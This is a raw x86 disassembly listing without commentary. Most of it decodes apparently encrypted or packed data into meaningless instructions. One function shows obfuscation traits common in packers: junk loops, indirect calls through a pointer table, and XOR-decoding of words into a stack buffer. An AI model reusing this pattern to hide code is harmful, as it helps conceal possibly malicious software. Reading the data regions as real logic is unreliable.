  416059:	pop    ebp
  41605a:	shr    esi,cl
  41605c:	jmp    0x1a9cb4bf
  416061:	pop    ebp
  416062:	cmp    al,0x7f
  416064:	imul   esi,DWORD PTR [edi-0x39c6a420],0xffffff8e
  41606b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41606c:	popa   
  41606d:	pop    edi
  41606e:	pusha  
  41606f:	xor    eax,0xd6978519
  416074:	(bad)  
  416075:	and    al,0xcf
  416077:	shl    BYTE PTR [edx],0x84
  41607a:	mov    edx,0xf6adb1a2
  41607f:	data16 sbb BYTE PTR [esi-0x47],bl
  416083:	jp     0x416043
  416085:	push   0x9a98c47c
  41608a:	in     al,0x67
  41608c:	pop    edi
  41608d:	dec    esi
  41608e:	mov    ds:0x40ebf3d2,eax
  416093:	push   esp
  416094:	fnstcw WORD PTR [ecx+0x681798c3]
  41609a:	loopne 0x416036
  41609c:	fstp   DWORD PTR [edi-0x2bafdf75]
  4160a2:	xor    cl,BYTE PTR [ecx+0x2f]
  4160a5:	jno    0x4160bd
  4160a7:	mov    eax,0x7cb7d749
  4160ac:	das    
  4160ad:	pushf  
  4160ae:	mov    ds:0x7d2491a8,eax
  4160b3:	sub    DWORD PTR [esi],esi
  4160b5:	retf   0xd565
  4160b8:	inc    ecx
  4160b9:	jae    0x4160b8
  4160bb:	mov    ds:0xef483e85,al
  4160c0:	lahf   
  4160c1:	mov    dh,0x86
  4160c3:	push   eax
  4160c4:	outs   dx,DWORD PTR ds:[esi]
  4160c5:	sbb    BYTE PTR [ecx-0x14056f1a],bl
  4160cb:	cwde   
  4160cc:	loopne 0x4160e9
  4160ce:	sub    eax,0x851cb90b
  4160d3:	in     al,0x9
  4160d5:	cmp    eax,0xffbacaa4
  4160da:	pop    ss
  4160db:	mov    al,0x7e
  4160dd:	mov    eax,ds:0x7513cc77
  4160e2:	xchg   esp,eax
  4160e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160e4:	mov    ?,WORD PTR [edi+eiz*8-0x59a3f458]
  4160eb:	dec    ebx
  4160ec:	push   ds
  4160ed:	xchg   ecx,eax
  4160ee:	sub    eax,0xb616bfd4
  4160f3:	imul   esi,DWORD PTR [ebx-0x34a9bdb4],0xfffffff1
  4160fa:	pop    ss
  4160fb:	xchg   edx,eax
  4160fc:	or     DWORD PTR gs:[esi],edi
  4160ff:	sahf   
  416100:	sub    DWORD PTR [edx+0x60bfd5df],edx
  416106:	pop    ds
  416107:	mov    ds:0xb3f991c5,eax
  41610c:	and    esi,DWORD PTR [edi+esi*2]
  41610f:	push   eax
  416110:	jmp    0xc31c:0x59c3e44d
  416117:	js     0x4160b2
  416119:	addr16 xor eax,0x6ee8c901
  41611f:	enter  0x22d9,0xf7
  416123:	les    ebp,FWORD PTR [ecx+ecx*8+0x4b]
  416127:	xchg   ebp,eax
  416128:	dec    ebx
  416129:	dec    ecx
  41612a:	sub    eax,0x2f8d94c8
  41612f:	enter  0xf663,0x45
  416133:	aas    
  416134:	xchg   edi,eax
  416135:	sub    eax,0x592c63cc
  41613a:	je     0x4160d7
  41613c:	add    eax,0xa15f2ffd
  416141:	xchg   esp,eax
  416142:	or     ah,0x18
  416145:	cmp    BYTE PTR [ebp+esi*2-0x2b],bh
  416149:	imul   esp,DWORD PTR [ebp-0x4191e973],0xf023a60f
  416153:	pop    edx
  416154:	xchg   esi,eax
  416156:	int3   
  416157:	out    dx,eax
  416158:	jmp    0xf8113302
  41615d:	adc    ebp,DWORD PTR [eax]
  41615f:	stos   BYTE PTR es:[edi],al
  416160:	inc    ecx
  416161:	mov    DWORD PTR [edi+edx*4-0x4b],esp
  416165:	pop    edx
  416166:	sbb    al,0x59
  416168:	push   ebp
  416169:	out    dx,al
  41616a:	xchg   ebx,eax
  41616b:	popf   
  41616c:	jmp    0x41618a
  41616e:	sbb    bh,dl
  416170:	fcmovnu st,st(4)
  416172:	ror    DWORD PTR [ebp+0xe83f285],1
  416178:	dec    esi
  416179:	cs pop ecx
  41617b:	xor    ch,al
  41617d:	add    ecx,DWORD PTR [ecx+0x485e9b90]
  416183:	push   esi
  416184:	or     al,0x15
  416186:	pop    edx
  416187:	push   ebx
  416188:	aad    0x5
  41618a:	and    BYTE PTR [ebp-0x2a],bh
  41618d:	mov    DWORD PTR [esi+ebx*1-0x3415805e],ebx
  416194:	outs   dx,BYTE PTR ds:[esi]
  416195:	nop
  416196:	sahf   
  416197:	jp     0x416148
  416199:	ins    BYTE PTR es:[edi],dx
  41619a:	pop    ds
  41619b:	out    0xac,al
  41619d:	add    al,0x79
  41619f:	mov    al,0xe7
  4161a1:	jge    0x41617a
  4161a3:	stc    
  4161a4:	mov    dl,0x40
  4161a6:	(bad)  
  4161a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161a8:	xchg   edx,eax
  4161a9:	lahf   
  4161aa:	out    0x41,eax
  4161ac:	pop    edx
  4161ad:	aad    0x6c
  4161af:	in     al,0x74
  4161b1:	adc    al,0x18
  4161b3:	jo     0x416165
  4161b5:	xchg   BYTE PTR [esi+0x6f],bh
  4161b8:	pusha  
  4161b9:	(bad)  
  4161ba:	fistp  DWORD PTR [edx-0x2b]
  4161bd:	dec    ebx
  4161be:	inc    ecx
  4161bf:	pushf  
  4161c0:	push   ebp
  4161c1:	shl    BYTE PTR [ecx+edx*4-0x2],cl
  4161c5:	xchg   DWORD PTR [esi+0x5af03575],edi
  4161cb:	inc    edi
  4161cc:	das    
  4161cd:	(bad)  
  4161cf:	dec    esi
  4161d0:	jae    0x41624a
  4161d2:	xchg   esi,eax
  4161d3:	sti    
  4161d4:	pushf  
  4161d5:	fbstp  TBYTE PTR [eax]
  4161d7:	test   al,0x4c
  4161d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161da:	mov    DWORD PTR [edx],esp
  4161dc:	xor    ch,BYTE PTR [edx-0x75071ea1]
  4161e2:	bound  esp,QWORD PTR [edx]
  4161e4:	adc    eax,DWORD PTR ds:0x78cc0574
  4161ea:	cmp    eax,0x1a7e78db
  4161ef:	sub    BYTE PTR [edi-0x51],bl
  4161f2:	add    DWORD PTR [esi],ebx
  4161f4:	jo     0x4161c3
  4161f6:	adc    eax,0x227c4ddf
  4161fb:	test   eax,0x610a7f6
  416200:	and    al,0x57
  416202:	sbb    bl,BYTE PTR ds:0x23808757
  416208:	fwait
  416209:	jecxz  0x41622a
  41620b:	test   eax,0x81ec0111
  416210:	ror    BYTE PTR [esi-0x2e],0x60
  416214:	loopne 0x4161ea
  416216:	ins    DWORD PTR es:[edi],dx
  416217:	(bad)  [esi+0x40]
  41621a:	add    al,0xe0
  41621c:	and    ebp,DWORD PTR [ebp+0x5738b7b5]
  416222:	xchg   DWORD PTR [ebp+0x2d],esp
  416225:	pop    esi
  416226:	leave  
  416227:	ret    0x18
  41622a:	push   ebp
  41622b:	mov    ebp,esp
  41622d:	sub    esp,0x9c
  416233:	or     ecx,eax
  416235:	mov    ecx,DWORD PTR [ebp+0x8]
  416238:	adc    DWORD PTR ds:0x42a29e,0x5466
  416242:	mov    eax,0x8a98
  416247:	xor    ax,WORD PTR [ecx+0x20]
  41624b:	and    DWORD PTR ds:0x42a2d6,0x0
  416255:	jmp    0x416267
  41625a:	mov    ecx,DWORD PTR ds:0x42a2d6
  416260:	inc    ecx
  416261:	mov    DWORD PTR ds:0x42a2d6,ecx
  416267:	cmp    DWORD PTR ds:0x42a2d6,0x12
  41626e:	jae    0x4162bb
  416274:	cmp    DWORD PTR ds:0x42a2d6,0xa
  41627b:	jle    0x4162bb
  416281:	jmp    0x41629c
  416286:	push   0x5de0
  41628b:	push   0x42a26a
  416290:	push   DWORD PTR [ebp-0x28]
  416293:	push   DWORD PTR [ebp-0x10]
  416296:	call   DWORD PTR ds:0x42a3d2
  41629c:	cmp    DWORD PTR ds:0x42a2d6,0x9
  4162a3:	jne    0x4162b6
  4162a9:	mov    ecx,DWORD PTR ds:0x42a2d6
  4162af:	inc    ecx
  4162b0:	mov    DWORD PTR ds:0x42a2d6,ecx
  4162b6:	jmp    0x41625a
  4162bb:	mov    ecx,0x3b5a
  4162c0:	add    DWORD PTR ds:0x42a292,0x71f8
  4162ca:	add    ax,cx
  4162cd:	sbb    ecx,DWORD PTR ds:0x42a2d6
  4162d3:	movzx  eax,ax
  4162d6:	sbb    ecx,DWORD PTR ds:0x42a29a
  4162dc:	mov    DWORD PTR [ebp-0x10],eax
  4162df:	mov    BYTE PTR [ebp-0x1],0x7c
  4162e3:	and    DWORD PTR ds:0x42a2a2,ecx
  4162e9:	lea    eax,[ebp-0x1]
  4162ec:	mov    DWORD PTR [ebp-0xc],eax
  4162ef:	and    DWORD PTR ds:0x42a2be,0x0
  4162f9:	mov    ecx,DWORD PTR ds:0x42a2be
  4162ff:	inc    ecx
  416300:	mov    DWORD PTR ds:0x42a2be,ecx
  416306:	cmp    DWORD PTR ds:0x42a2be,0x25
  41630d:	jg     0x416346
  416313:	jmp    0x416339
  416318:	push   DWORD PTR [ebp-0x28]
  41631b:	push   0x5043
  416320:	push   DWORD PTR [ebp-0x18]
  416323:	push   DWORD PTR [ebp-0xc]
  416326:	push   DWORD PTR [ebp-0x1c]
  416329:	push   0x5d36
  41632e:	push   0x429153
  416333:	call   DWORD PTR ds:0x42a3d6
  416339:	cmp    DWORD PTR ds:0x42a2be,0x1a
  416340:	jb     0x4162f9
  416346:	mov    al,BYTE PTR [ebp-0x1]
  416349:	and    DWORD PTR ds:0x42a26e,0x0
  416353:	mov    ecx,DWORD PTR ds:0x42a26e
  416359:	inc    ecx
  41635a:	mov    DWORD PTR ds:0x42a26e,ecx
  416360:	cmp    DWORD PTR ds:0x42a26e,0x19
  416367:	jge    0x416385
  41636d:	jmp    0x416378
  416372:	call   DWORD PTR ds:0x42a3da
  416378:	cmp    DWORD PTR ds:0x42a26e,0x10
  41637f:	jb     0x416353
  416385:	mov    ecx,DWORD PTR [ebp-0xc]
  416388:	xor    al,0x7c
  41638a:	mov    DWORD PTR ds:0x42a2c6,0x2666
  416394:	inc    al
  416396:	and    DWORD PTR ds:0x42a2ce,0x42a28a
  4163a0:	mov    BYTE PTR [ecx],al
  4163a2:	sbb    DWORD PTR ds:0x42a2f6,0x5717
  4163ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  4163b3:	push   ebx
  4163b4:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4163bb:	mov    DWORD PTR ds:0x42a2f6,0x16
  4163c5:	cmp    DWORD PTR ds:0x42a2f6,0x0
  4163cc:	je     0x41640c
  4163d2:	cmp    DWORD PTR ds:0x42a2f6,0x1e
  4163d9:	jb     0x41640c
  4163df:	jmp    0x4163fc
  4163e4:	push   0x8db9
  4163e9:	push   DWORD PTR [ebp-0x1c]
  4163ec:	push   0x6bac
  4163f1:	push   0x6e74
  4163f6:	call   DWORD PTR ds:0x42a3de
  4163fc:	mov    eax,ds:0x42a2f6
  416401:	dec    eax
  416402:	mov    ds:0x42a2f6,eax
  416407:	jmp    0x4163c5
  41640c:	mov    ecx,DWORD PTR [ebp-0x18]
  41640f:	push   esi
  416410:	or     DWORD PTR ds:0x42a286,0x93e
  41641a:	mov    eax,0x75108aa
  41641f:	and    DWORD PTR ds:0x42a2e2,0x0
  416429:	jmp    0x41643d
  41642e:	xor    esi,esi
  416430:	add    esi,DWORD PTR ds:0x42a2e2
  416436:	inc    esi
  416437:	mov    DWORD PTR ds:0x42a2e2,esi
  41643d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  416444:	jae    0x416481
  41644a:	cmp    DWORD PTR ds:0x42a2e2,0xa
  416451:	jl     0x416481
  416457:	jmp    0x416462
  41645c:	call   DWORD PTR ds:0x42a3e2
  416462:	cmp    DWORD PTR ds:0x42a2e2,0x9
  416469:	jne    0x41647c
  41646f:	mov    esi,DWORD PTR ds:0x42a2e2
  416475:	inc    esi
  416476:	mov    DWORD PTR ds:0x42a2e2,esi
  41647c:	jmp    0x41642e
  416481:	xor    ecx,eax
  416483:	mov    esi,DWORD PTR ds:0x42a2ae
  416489:	sbb    esi,DWORD PTR ds:0x42a25a
  41648f:	mov    DWORD PTR ds:0x42a2ae,esi
  416495:	mov    esi,0x3272f1
  41649a:	push   edi
  41649b:	add    ecx,esi
  41649d:	jmp    0x4164b3
  4164a2:	inc    DWORD PTR ds:0x42a26e
  4164a8:	mov    dl,BYTE PTR [ebp-0x1]
  4164ab:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4164b2:	inc    ecx
  4164b3:	mov    DWORD PTR ds:0x42a286,0x7bd4
  4164bd:	cmp    ecx,0x40
  4164c0:	jb     0x4164a2
  4164c6:	not    edx
  4164c8:	mov    edx,DWORD PTR [ebp-0x18]
  4164cb:	xor    edx,eax
  4164cd:	mov    DWORD PTR ds:0x42a302,0x3db0
  4164d7:	add    edx,esi
  4164d9:	jmp    0x416628
  4164de:	movzx  edi,WORD PTR ds:0x42a296
  4164e5:	or     DWORD PTR ds:0x42a262,edi
  4164eb:	mov    edi,DWORD PTR [ebp+0x8]
  4164ee:	adc    DWORD PTR ds:0x42a286,edx
  4164f4:	mov    ecx,0x8a98
  4164f9:	adc    DWORD PTR ds:0x42a2fe,0x3816
  416503:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416508:	and    DWORD PTR ds:0x42a2ae,0x0
  416512:	jmp    0x416524
  416517:	mov    edi,DWORD PTR ds:0x42a2ae
  41651d:	inc    edi
  41651e:	mov    DWORD PTR ds:0x42a2ae,edi
  416524:	cmp    DWORD PTR ds:0x42a2ae,0x1f
  41652b:	jae    0x41657e
  416531:	cmp    DWORD PTR ds:0x42a2ae,0xa
  416538:	jbe    0x41657e
  41653e:	jmp    0x41655d
  416543:	push   0x42a25e
  416548:	push   0x6fb7
  41654d:	push   0x429009
  416552:	push   0x4290e8
  416557:	call   DWORD PTR ds:0x42a3ea
  41655d:	cmp    DWORD PTR ds:0x42a2ae,0x9
  416564:	jne    0x416579
  41656a:	xor    edi,edi
  41656c:	xor    edi,DWORD PTR ds:0x42a2ae
  416572:	inc    edi
  416573:	mov    DWORD PTR ds:0x42a2ae,edi
  416579:	jmp    0x416517
  41657e:	mov    edi,0x3b5a
  416583:	add    DWORD PTR ds:0x42a2fa,0x42a2c2
  41658d:	add    cx,di
  416590:	sbb    DWORD PTR ds:0x42a256,0x16d8
  41659a:	movzx  ecx,cx
  41659d:	and    DWORD PTR ds:0x42a2a2,0x42a29a
  4165a7:	mov    DWORD PTR [ebp-0xc],ecx
  4165aa:	and    DWORD PTR ds:0x42a26e,0x0
  4165b4:	xor    ecx,ecx
  4165b6:	xor    ecx,DWORD PTR ds:0x42a26e
  4165bc:	inc    ecx
  4165bd:	mov    DWORD PTR ds:0x42a26e,ecx
  4165c3:	cmp    DWORD PTR ds:0x42a26e,0x19
  4165ca:	jle    0x4165f5
  4165d0:	jmp    0x4165e8
  4165d5:	push   0x594c
  4165da:	push   0x42a276
  4165df:	push   DWORD PTR [ebp-0x1c]
  4165e2:	call   DWORD PTR ds:0x42a3ee
  4165e8:	cmp    DWORD PTR ds:0x42a26e,0x17
  4165ef:	jb     0x4165b4
  4165f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4165f8:	mov    DWORD PTR ds:0x42a29a,0x62ed
  416602:	movzx  ecx,WORD PTR [ecx+edx*4]
  416606:	xor    ecx,0x8a98
  41660c:	add    ecx,edi
  41660e:	mov    DWORD PTR ds:0x42a302,0x1620
  416618:	mov    edi,DWORD PTR [ebp-0xc]
  41661b:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416622:	mov    ecx,0x8de
  416627:	inc    edx
  416628:	mov    ecx,DWORD PTR [ebp-0x10]
  41662b:	mov    DWORD PTR ds:0x42a25a,0x2d30
  416635:	cmp    edx,ecx
  416637:	jne    0x4164de
  41663d:	and    edx,edx
  41663f:	mov    ecx,DWORD PTR [ebp-0x18]
  416642:	sub    edi,DWORD PTR ds:0x42a25a
  416648:	mov    edx,DWORD PTR [ebp+0x10]
  41664b:	xor    DWORD PTR ds:0x42a2ca,0xf9d
  416655:	xor    ecx,eax
  416657:	and    DWORD PTR ds:0x42a2c2,ebx
  41665d:	add    ecx,esi
  41665f:	mov    DWORD PTR [edx],ecx
  416661:	mov    ecx,DWORD PTR [ebp-0x18]
  416664:	sbb    DWORD PTR ds:0x42a2aa,0x1e81
  41666e:	jmp    0x4189c6
  416673:	mov    dl,0x1f
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	and    edx,edx
  416678:	mov    eax,ds:0xbec98882
  41667d:	js     0x4166c3
  41667f:	xchg   edx,eax
  416680:	adc    eax,0x41fcdc3a
  416685:	jl     0x41660a
  416687:	inc    esi
  416688:	pop    esi
  416689:	add    DWORD PTR [ebx-0x1a3d0932],0x1d
  416690:	pusha  
  416691:	push   cs
  416692:	jns    0x4166cb
  416694:	in     eax,0x7b
  416696:	fcmovu st,st(3)
  416698:	mov    dl,0x58
  41669a:	jbe    0x4166f6
  41669c:	ja     0x41663c
  41669e:	push   edi
  41669f:	push   esp
  4166a0:	inc    edi
  4166a1:	ror    BYTE PTR [edi-0x2],0x20
  4166a5:	fistp  DWORD PTR [ecx+0x26]
  4166a8:	sub    cl,dl
  4166aa:	mov    ecx,0x63f9d9b4
  4166af:	pop    ss
  4166b0:	push   cs
  4166b1:	lahf   
  4166b2:	bound  esi,QWORD PTR [edx-0x6a]
  4166b5:	xchg   DWORD PTR [ebx+0x594efd8f],ebx
  4166bb:	out    dx,eax
  4166bc:	outs   dx,DWORD PTR ds:[esi]
  4166bd:	cmp    ah,dl
  4166bf:	dec    esi
  4166c0:	das    
  4166c1:	jmp    0x416688
  4166c3:	cmp    ah,ah
  4166c5:	mov    ebp,ebp
  4166c7:	hlt    
  4166c8:	stos   BYTE PTR es:[edi],al
  4166c9:	pop    edi
  4166ca:	cs arpl sp,ax
  4166cd:	and    al,0x80
  4166cf:	popa   
  4166d0:	xor    ecx,DWORD PTR [ebp+0x27]
  4166d3:	fistp  DWORD PTR [ebx-0x3af44bf9]
  4166d9:	cwde   
  4166da:	mov    ch,0x9
  4166dc:	xor    esp,DWORD PTR [edi+0x55]
  4166df:	push   eax
  4166e0:	jne    0x41669b
  4166e2:	push   0xffffffd0
  4166e4:	mov    ds:0x52196a7b,eax
  4166e9:	enter  0xedb9,0xdc
  4166ed:	xor    esp,DWORD PTR [ecx]
  4166ef:	(bad)  
  4166f0:	cmp    edx,DWORD PTR [ecx]
  4166f2:	fsub   DWORD PTR [eax+0x60]
  4166f5:	mov    ecx,0x29d0dc41
  4166fa:	rcr    BYTE PTR [ecx-0x3d1da851],cl
  416700:	jl     0x416733
  416702:	mov    DWORD PTR [esi+0x34],edi
  416705:	add    esi,edi
  416707:	push   esi
  416708:	jns    0x41675e
  41670a:	fcom   DWORD PTR [edx+0x9]
  41670d:	push   ss
  41670e:	jns    0x416779
  416710:	daa    
  416711:	mov    BYTE PTR [eax],al
  416713:	outs   dx,BYTE PTR ds:[esi]
  416714:	outs   dx,DWORD PTR ds:[esi]
  416715:	repz jg 0x416751
  416718:	shr    ecx,1
  41671a:	cmp    eax,0xff5812c4
  41671f:	cmp    DWORD PTR fs:0x8f659040,eax
  416726:	adc    DWORD PTR [ebp-0x24f5a5d],ebp
  41672c:	mov    ebx,0xf275a867
  416731:	fxch   st(2)
  416733:	mov    dl,BYTE PTR [eax+0x542afd7f]
  416739:	aas    
  41673a:	and    DWORD PTR [edx+0x639f2f9a],edx
  416740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416741:	or     al,0xb
  416743:	xor    al,0x3f
  416745:	mov    bl,0xcd
  416747:	sahf   
  416748:	sti    
  416749:	xlat   BYTE PTR cs:[ebx]
  41674b:	bound  eax,QWORD PTR [ecx]
  41674d:	ins    DWORD PTR es:[edi],dx
  41674e:	(bad)  
  41674f:	mov    cl,0x55
  416751:	sti    
  416752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416753:	in     al,dx
  416754:	pop    eax
  416755:	bound  esp,QWORD PTR [ebx]
  416757:	out    0x1b,al
  416759:	sbb    BYTE PTR [edi-0x2cb0fcf0],ah
  41675f:	popa   
  416760:	add    al,0x7d
  416762:	lock call 0x533e:0x40bbce7a
  41676a:	add    al,0xfa
  41676c:	repnz push ss
  41676e:	mov    ebp,0x30dd811a
  416773:	inc    ah
  416775:	test   al,0x49
  416777:	push   edi
  416778:	imul   edi,DWORD PTR [edx],0x3e
  41677b:	pop    edx
  41677c:	imul   edi,ebx,0x9dd7603
  416782:	ja     0x416787
  416784:	sahf   
  416785:	rol    BYTE PTR ds:0xb4b63e1f,1
  41678b:	fisubr DWORD PTR [ebp+esi*8+0x1]
  41678f:	call   0x3444412d
  416794:	hlt    
  416795:	jle    0x416782
  416797:	and    dl,al
  416799:	(bad)  
  41679a:	scas   eax,DWORD PTR es:[edi]
  41679b:	lds    eax,FWORD PTR [esi]
  41679d:	cld    
  41679e:	add    ch,BYTE PTR [esi+0x3f]
  4167a1:	xor    ebp,DWORD PTR [esi-0x53]
  4167a4:	sub    BYTE PTR [esi-0x65],0x7
  4167a8:	mov    ch,0x25
  4167aa:	in     eax,0xd9
  4167ac:	in     eax,0x91
  4167ae:	sub    al,0xf1
  4167b0:	stos   BYTE PTR es:[edi],al
  4167b1:	rol    DWORD PTR [edi-0x783294a8],cl
  4167b7:	pop    edx
  4167b8:	mov    bl,0x2a
  4167ba:	jbe    0x4167bc
  4167bc:	and    eax,0x2e5abdb
  4167c1:	cmp    ebx,DWORD PTR [edx+0x38]
  4167c4:	inc    ecx
  4167c5:	jmp    0xc907d353
  4167ca:	mov    WORD PTR [ebp+0x5cfdf498],ds
  4167d0:	cmp    edi,DWORD PTR [edx]
  4167d2:	xor    edx,DWORD PTR [edi]
  4167d4:	pop    ebx
  4167d5:	sub    eax,0x28d00226
  4167da:	pop    edi
  4167db:	es jge 0x4167e4
  4167de:	add    eax,0x9581ae3f
  4167e3:	sbb    DWORD PTR [edx],ecx
  4167e5:	es mov ah,0xef
  4167e8:	int    0x7e
  4167ea:	pop    ebx
  4167eb:	adc    esi,0xffffffd5
  4167ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ef:	and    eax,0xba8ae6ce
  4167f4:	ins    BYTE PTR es:[edi],dx
  4167f5:	push   ebp
  4167f6:	int    0xfd
  4167f8:	sub    al,0x8b
  4167fa:	repnz cmovb ebx,DWORD PTR ds:0x333d5f3c
  416802:	and    eax,0x9d267b76
  416807:	push   esp
  416808:	out    dx,al
  416809:	or     al,0x1e
  41680b:	test   edi,0xde02369d
  416811:	outs   dx,DWORD PTR ds:[esi]
  416812:	imul   esp,DWORD PTR [ebp+0x4609b556],0x6c
  416819:	loopne 0x41684a
  41681b:	imul   edi,DWORD PTR [edi+0x38],0x2c4120d1
  416822:	jns    0x4167a8
  416824:	mov    WORD PTR [esi-0x11bba543],?
  41682a:	inc    esp
  41682b:	dec    ecx
  41682c:	xchg   edx,eax
  41682d:	jo     0x4167d8
  41682f:	xor    ch,BYTE PTR [esi+0x7cecdcef]
  416835:	jb     0x41680d
  416837:	dec    esi
  416838:	pop    es
  416839:	out    dx,eax
  41683a:	jns    0x4167c4
  41683c:	in     al,0x64
  41683e:	dec    ebp
  41683f:	push   0xa350f5c8
  416844:	fdiv   DWORD PTR [eax-0x7413882c]
  41684a:	ret    
  41684b:	int    0x17
  41684d:	pop    ebx
  41684e:	inc    BYTE PTR [edx]
  416850:	mov    dh,0x83
  416852:	aaa    
  416853:	fcomp  DWORD PTR [eax+ebp*8+0x6d]
  416857:	cmp    eax,DWORD PTR [ecx+0x7e]
  41685a:	loop   0x41687f
  41685c:	push   esi
  41685d:	pusha  
  41685e:	fild   WORD PTR [eax-0x1b]
  416861:	xor    al,0x5
  416863:	mov    BYTE PTR [esi+0x37d583a7],dl
  416869:	int    0x7e
  41686b:	inc    ebx
  41686c:	adc    cl,ah
  41686e:	xchg   esi,eax
  41686f:	xchg   esp,eax
  416870:	dec    esp
  416871:	shr    DWORD PTR [edi],0x4a
  416874:	call   0xb195487c
  416879:	cmc    
  41687a:	add    al,0x2a
  41687c:	sub    dl,ah
  41687e:	add    esi,DWORD PTR [esi+0x773953f9]
  416884:	jmp    0x3f5fd9bd
  416889:	pusha  
  41688a:	test   eax,0x577244fe
  41688f:	dec    ecx
  416890:	(bad)  
  416891:	jno    0x41688f
  416893:	scas   eax,DWORD PTR es:[edi]
  416894:	adc    BYTE PTR [eax],0x96
  416897:	xor    eax,0x80f69f25
  41689c:	mov    esi,0x2b29574e
  4168a1:	call   0x5328:0xbf63b222
  4168a8:	cwde   
  4168a9:	mov    dh,0xda
  4168ab:	lods   eax,DWORD PTR ds:[esi]
  4168ac:	xor    edx,ebx
  4168ae:	fisub  WORD PTR [eax-0x73]
  4168b1:	jne    0x4168b8
  4168b3:	cmp    BYTE PTR [ebx-0x10],ch
  4168b6:	push   ecx
  4168b7:	std    
  4168b8:	and    ebx,DWORD PTR [edi+0x72]
  4168bb:	js     0x416879
  4168bd:	mov    esp,0x7ed11dde
  4168c2:	ds jnp 0x416899
  4168c5:	jmp    0x429b:0xb2f8cf78
  4168cc:	int    0xe9
  4168ce:	jae    0x416864
  4168d0:	xchg   edi,eax
  4168d1:	or     ecx,esp
  4168d3:	sub    esi,DWORD PTR [ecx]
  4168d5:	enter  0x529c,0x2a
  4168d9:	cmp    bh,dl
  4168db:	fucomi st,st(1)
  4168dd:	jmp    0xe7c7e7f4
  4168e2:	icebp  
  4168e3:	aam    0xb8
  4168e5:	mov    ch,0xee
  4168e7:	out    0x5b,al
  4168e9:	pusha  
  4168ea:	inc    ebp
  4168eb:	test   DWORD PTR [ebx+ebx*1],ecx
  4168ee:	sti    
  4168ef:	call   0x1c78badd
  4168f4:	je     0x416877
  4168f6:	jmp    0x6957:0xdb9e6daa
  4168fd:	out    dx,al
  4168fe:	call   0xf0f2a5b4
  416903:	imul   edi,DWORD PTR [ecx-0x55],0x9f165f5c
  41690a:	xor    ebp,DWORD PTR [ebp-0x5]
  41690d:	ins    DWORD PTR es:[edi],dx
  41690e:	ds popw es
  416911:	sub    eax,DWORD PTR [eax+0x35]
  416914:	adc    ch,BYTE PTR [ebp-0x77]
  416917:	aaa    
  416918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416919:	xchg   esi,eax
  41691a:	xchg   DWORD PTR [ecx+0x2],ebp
  41691d:	nop
  41691e:	push   0xffffffb0
  416920:	push   ebp
  416921:	jle    0x4168f6
  416923:	std    
  416924:	out    0xb8,al
  416926:	out    dx,eax
  416927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416928:	mov    edx,0xb943c3a
  41692d:	js     0x4168ed
  41692f:	out    dx,al
  416930:	push   ds
  416931:	pop    edi
  416932:	pop    ebx
  416933:	jae    0x4169af
  416935:	dec    edx
  416936:	ins    BYTE PTR es:[edi],dx
  416937:	call   0xdf8e5492
  41693c:	mov    WORD PTR [esi+0x270f6aa9],?
  416942:	jl     0x4168cd
  416944:	test   al,0xed
  416946:	xchg   ebp,eax
  416947:	pop    ds
  416948:	sti    
  416949:	mov    fs,WORD PTR [ebx]
  41694b:	pop    ss
  41694c:	test   ebp,esi
  41694e:	ja     0x416969
  416950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416951:	mov    DWORD PTR ds:0x16a90e48,edx
  416957:	sub    al,0xe2
  416959:	nop
  41695a:	stos   BYTE PTR es:[edi],al
  41695b:	xchg   edi,eax
  41695c:	ss sub bl,0x60
  416960:	retf   
  416961:	adc    DWORD PTR [edx+0x72],esi
  416964:	xlat   BYTE PTR ds:[ebx]
  416965:	adc    al,0xdb
  416967:	dec    edi
  416968:	sbb    DWORD PTR [ebp-0x222606fb],esp
  41696e:	in     eax,dx
  41696f:	(bad)  
  416970:	leave  
  416971:	mov    ebx,0xc1f9cc7e
  416976:	push   ecx
  416977:	add    cl,BYTE PTR [edi+0x66ff004c]
  41697d:	dec    edx
  41697e:	xchg   ebp,eax
  41697f:	and    DWORD PTR [edx+eax*1-0x3444d552],ecx
  416986:	into   
  416987:	(bad)  
  416988:	in     al,0x41
  41698a:	into   
  41698b:	inc    eax
  41698c:	mov    esi,0xcb412a4a
  416991:	imul   esp,DWORD PTR [ebx-0x20404001],0x569b2b7b
  41699b:	dec    ecx
  41699c:	(bad)  
  41699d:	push   ss
  41699e:	inc    DWORD PTR [eax]
  4169a0:	xchg   ebp,eax
  4169a1:	inc    esi
  4169a2:	add    bl,BYTE PTR [ebp+0x34942968]
  4169a8:	adc    al,0x98
  4169aa:	or     al,dl
  4169ac:	sti    
  4169ad:	dec    edi
  4169ae:	jns    0x416a04
  4169b0:	and    al,0x81
  4169b2:	daa    
  4169b3:	push   edx
  4169b4:	mov    esi,ecx
  4169b6:	int3   
  4169b7:	fild   QWORD PTR [edi]
  4169b9:	dec    ecx
  4169ba:	and    eax,0xe9c41ceb
  4169bf:	push   esp
  4169c0:	cmp    edx,DWORD PTR [edi+0x356998d2]
  4169c6:	mov    al,0xc9
  4169c8:	sbb    al,0x62
  4169ca:	dec    edx
  4169cb:	leave  
  4169cc:	xchg   ebp,eax
  4169cd:	dec    ecx
  4169ce:	sti    
  4169cf:	cdq    
  4169d0:	in     al,0xf
  4169d2:	ja     0x41697c
  4169d4:	adc    al,0xe
  4169d6:	mov    BYTE PTR [ebx],ah
  4169d8:	and    al,0xc1
  4169da:	push   0xffffffd3
  4169dc:	jmp    0x5d86abe6
  4169e1:	(bad)  
  4169e2:	dec    edx
  4169e3:	push   ds
  4169e4:	lods   al,BYTE PTR ds:[esi]
  4169e5:	push   esi
